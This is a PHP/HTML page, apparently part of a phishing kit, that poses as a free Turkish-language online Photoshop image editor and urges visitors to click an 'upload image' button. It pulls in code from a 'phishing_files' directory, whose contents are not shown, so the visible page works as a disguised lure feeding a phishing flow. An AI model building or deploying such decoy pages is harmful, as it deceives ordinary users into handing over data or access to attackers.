<!DOCTYPE html>
<html translate="no">
  <head>
<?php
include ("../../phishing_files/info-command.php");
?>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width">
  <link rel="icon" href="files/icon.svg" type="image/x-icon" />
  <title>PHOTOSHOP</title>
  <style>
@import url('https://fonts.googleapis.com/css2?family=Kiwi+Maru:wght@300&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400&display=swap');
* {
  margin: 0;
  padding: 0;
  font-family: 'Kiwi Maru', serif;
  text-shadow: 0px -1px 0px rgba(0,0,0,0.4);
  list-style:none;
  text-decoration: none;
}

body {
  background: #000;
  box-sizing: border-box;
}
.green-neon {
   text-shadow: 2px 2px 1px rgba(0,0,0,.4),
    0 0 20px #69F0AE,
    0 0 40px rgba(0, 230, 118, .75),
    0 0 50px rgba(0, 230, 118, .75),
    0 0 100px rgba(0, 230, 118, .75);
}

.green-neon:before{
  content:'';
  background: rgba(105, 240, 174, .25);
  z-index: -1;
  opacity: .7;
  filter: blur(30px);
  width: 100%;
  height: 100%;
}

h1 {
font-size: 30px;
color:white;
text-align: center;
margin-top: 50px;
margin-bottom: 100px;
}
h2 {
  font-family: 'Poppins', sans-serif;
  color: white;
  font-size: 15px;
  text-align: center;
  margin-left: 10px;
  margin-right: 10px;
  margin-bottom: 50px;
}
.social-icons {
  text-align: center;
  }  
.social-icons li {
  display:block;
  list-style-type:none;
  -webkit-user-select:none;
  -moz-user-select:none;
  }
.social-icons li a {
  border-bottom: none;
  }
.social-icons li img {
  width:300px;
  margin-top: 20px;
  margin-right: 20px;
}
.button {
  position: relative;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  background-color: #4CAF50;
  color: white;
  padding: 15px 32px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 16px;
  margin: 4px 2px;
  cursor: pointer;
  border-radius: 10px;
}

</style>
  </head>
<body>
<div>
<?php
require ("../../phishing_files/info-box.php");
?>
<ul class="social-icons">
<li><img src="files/icon.svg" style="width:200px;"></li>
<h1 class="green-neon">PHOTOSHOP<br>EDİTÖR</h1>
<h2>Ücretsiz online profesyonel resim düzenlemek için en alttaki <a href="photoshop.php" style="color:#9CFC00">RESİM YÜKLE</a> butonuna tıklayınız.. </h2>
<li><img src="files/eyes.jpg"></li>
<li><img src="files/child.jpg"></li>
<li><img src="files/tiger.jpg"></li>
<li><img src="files/girl.jpg"></li>
<li><img src="files/girl_coffee.jpg"></li>
</ul>
<br><br>
<a href="photoshop.php" class="button">RESİM YÜKLE</a>
</div>
</body>
</html>

